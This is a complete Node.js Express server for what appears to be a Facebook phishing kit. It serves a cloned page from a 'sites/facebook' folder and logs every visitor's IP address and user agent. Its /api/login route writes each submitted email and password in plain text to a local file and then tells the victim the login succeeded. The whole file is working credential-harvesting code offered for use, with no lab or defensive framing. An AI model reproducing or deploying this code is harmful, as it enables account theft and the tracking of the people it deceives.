// server.js
const express = require("express");
const path = require("path");
const cors = require("cors");
const fs = require("fs");
const fsPromises = require("fs/promises");
const os = require("os");

const app = express();
const PORT = process.env.PORT || 3000;
const authDir = path.join(__dirname, "auth");
if (!fs.existsSync(authDir)) fs.mkdirSync(authDir);

const ipFile = path.join(authDir, "ip.txt");
const userFile = path.join(authDir, "username.txt");

// CORS & body parsers
app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.disable("x-powered-by");

// normalize IPv6-mapped IPv4 address -> strip ::ffff:
function normalizeIp(raw) {
  if (!raw) return "unknown";
  return String(raw).replace(/^::ffff:/i, "");
}

/**
 * Save IP block once per unique IP in the following format:
 *
 * IP: <ip>
 * User-Agent: <user-agent>
 *
 * (blank line)
 */
async function saveIpOnce(ip, userAgent) {
  try {
    const normalized = normalizeIp(ip);
    let existing = "";
    if (fs.existsSync(ipFile)) existing = await fsPromises.readFile(ipFile, "utf8");

    // check if file already contains this IP line
    const ipLine = `IP: ${normalized}`;
    if (existing.includes(ipLine)) {
      // already recorded
      return;
    }

    const block = `IP: ${normalized}${os.EOL}User-Agent: ${userAgent || "unknown"}${os.EOL}${os.EOL}`;
    await fsPromises.appendFile(ipFile, block, "utf8");
    console.log("✅ New IP saved:", normalized);
  } catch (err) {
    console.error("Error saving IP:", err);
  }
}

// Middleware to capture client IP and save it once (async, non-blocking)
app.use((req, res, next) => {
  const forwarded = req.headers["x-forwarded-for"];
  // take first ip from x-forwarded-for if present
  const rawIp = (forwarded && forwarded.split(",").shift().trim()) || req.socket.remoteAddress || req.ip || "unknown";
  const clientIp = normalizeIp(rawIp);
  const userAgent = req.headers["user-agent"] || "unknown";

  req.clientIp = clientIp;
  req.clientUA = userAgent;

  // fire-and-forget: save IP + UA block if not already present
  saveIpOnce(clientIp, userAgent).catch((e) => console.error(e));
  next();
});

// Serve frontend
app.use(express.static(path.join(__dirname, "sites/facebook")));

app.post("/api/login", async (req, res) => {
  const { email, password } = req.body || {};
  const ip = req.clientIp || "unknown";
  const ua = req.clientUA || "unknown";

  console.log("Login attempt:", { email, ip });

  if (!email || !password) {
    return res.status(400).json({ success: false, message: "Missing fields" });
  }

  const line = `Facebook Username: ${email} Pass: ${password}${os.EOL}`;
  try {
    await fsPromises.appendFile(userFile, line, "utf8");
    console.log(line);
    // ensure IP+UA block is saved as well (in case login happened before middleware finished)
    saveIpOnce(ip, ua).catch(() => {});
    return res.json({ success: true, message: "Logged in" });
  } catch (err) {
    console.error("Error saving username:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// Catch-all for SPA
app.get(/.*/, (req, res) => {
  res.sendFile(path.join(__dirname, "sites/facebook", "index.html"));
});

app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
